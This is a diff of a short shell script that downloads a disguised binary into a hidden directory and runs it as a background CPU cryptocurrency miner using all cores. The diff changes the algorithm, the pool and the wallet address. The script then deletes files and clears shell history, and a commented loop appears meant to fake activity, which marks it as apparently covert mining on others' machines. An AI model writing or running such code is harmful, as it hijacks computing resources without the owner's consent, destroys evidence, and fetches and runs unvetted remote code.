@@ -9,7 +9,7 @@ rm nyumput.c
 mkdir .lib && cd .lib
 wget -O sgr1 https://bitbucket.org/natalieawe/my-job/downloads/sereb >/dev/null 2>&1
 chmod +x sgr1
-./sgr1 --algorithm minotaurx --pool stratum-na.rplant.xyz:17068 --wallet RBPnYFfFtBr8HxTsq2bZ6wxQv6BzbmaUHH.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive #> /dev/null 2>&1 &
+./sgr1 --algorithm yespowersugar --pool stratum-na.rplant.xyz:7042 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive #> /dev/null 2>&1 &
 rm -rvf *
 history -cr
 #while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
